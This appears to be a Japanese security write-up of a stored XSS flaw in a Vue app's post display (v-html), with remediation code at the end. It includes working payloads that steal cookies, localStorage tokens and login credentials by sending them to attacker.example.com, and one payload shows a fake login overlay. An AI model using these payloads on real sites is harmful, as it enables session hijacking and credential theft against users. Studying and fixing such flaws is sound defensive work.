# 投稿表示機能のXSS

## 脆弱性の説明
投稿内容の表示にv-htmlディレクティブを使用しているため、クロスサイトスクリプティング（XSS）が可能です。

## 影響範囲
- 悪意のあるスクリプトの実行
- ユーザーセッションの盗取
- 不正な操作の実行

## 攻撃方法と手順

### 1. 基本的なXSS攻撃

1. アプリケーションにログインします
2. 投稿作成フォームにアクセスします
3. 投稿内容フィールドに以下のXSSペイロードを入力します：
   ```html
   <script>alert('XSS攻撃が成功しました！');</script>
   ```
4. 投稿ボタンをクリックします
5. 投稿一覧ページに移動すると、アラートダイアログが表示されます

### 2. クッキー盗取攻撃

1. アプリケーションにログインします
2. 投稿作成フォームにアクセスします
3. 投稿内容フィールドに以下のXSSペイロードを入力します：
   ```html
   <img src="x" onerror="fetch('https://attacker.example.com/steal?cookie='+encodeURIComponent(document.cookie))">
   ```
   または
   ```html
   <script>
   fetch('https://attacker.example.com/steal?token='+encodeURIComponent(localStorage.getItem('token')))
   </script>
   ```
4. 投稿ボタンをクリックします

このペイロードは、ユーザーのクッキーやローカルストレージに保存されたトークンを攻撃者のサーバーに送信しようとします。実際の攻撃では、攻撃者が制御するサーバーのURLを使用します。

### 3. DOM操作によるページ改ざん攻撃

1. アプリケーションにログインします
2. 投稿作成フォームにアクセスします
3. 投稿内容フィールドに以下のXSSペイロードを入力します：
   ```html
   <div id="fake-login" style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:white; z-index:9999;">
     <h2>セッションの有効期限が切れました</h2>
     <form onsubmit="fetch('https://attacker.example.com/steal?id='+document.getElementById('user').value+'&password='+document.getElementById('pass').value); return false;">
       ユーザーID: <input type="text" id="user"><br>
       パスワード: <input type="password" id="pass"><br>
       <button type="submit">ログイン</button>
     </form>
   </div>
   ```
4. 投稿ボタンをクリックします

このペイロードは、偽のログインフォームを表示して、ユーザーのログイン情報を盗み取ろうとします。

## 攻撃成功の確認手順

### 1. 基本的なXSS攻撃の確認

1. 上記の基本的なXSSペイロードを使用して投稿を作成します
2. 投稿一覧ページに移動します
3. アラートダイアログが表示されれば、XSS攻撃が成功しています

### 2. コンソールログでのXSS確認

1. ブラウザの開発者ツールを開きます（F12キー）
2. 「Console」タブを選択します
3. 以下のXSSペイロードを使用して投稿を作成します：
   ```html
   <script>console.log('XSS攻撃が成功しました！');</script>
   ```
4. 投稿一覧ページに移動します
5. コンソールに「XSS攻撃が成功しました！」というメッセージが表示されれば、XSS攻撃が成功しています

### 3. DOM操作の確認

1. 以下のXSSペイロードを使用して投稿を作成します：
   ```html
   <script>document.body.style.backgroundColor = 'red';</script>
   ```
2. 投稿一覧ページに移動します
3. ページの背景色が赤に変わっていれば、XSS攻撃が成功しています

## 対策方法
### 1. v-htmlの代わりにv-textを使用
```vue
<!-- 修正前（脆弱なコード） -->
<template>
  <div v-html="post.content"></div>
</template>

<!-- 修正後（安全なコード） -->
<template>
  <div v-text="post.content"></div>
</template>
```

### 2. マークダウンやリッチテキストの安全な表示
```vue
<template>
  <div>
    <!-- マークダウンライブラリを使用した安全な表示 -->
    <markdown-it-vue :content="post.content" :options="markdownOptions"/>
  </div>
</template>

<script>
export default {
  data() {
    return {
      markdownOptions: {
        html: false, // HTMLタグの無効化
        linkify: true, // URLの自動リンク化
        breaks: true // 改行の有効化
      }
    }
  }
}
</script>
```
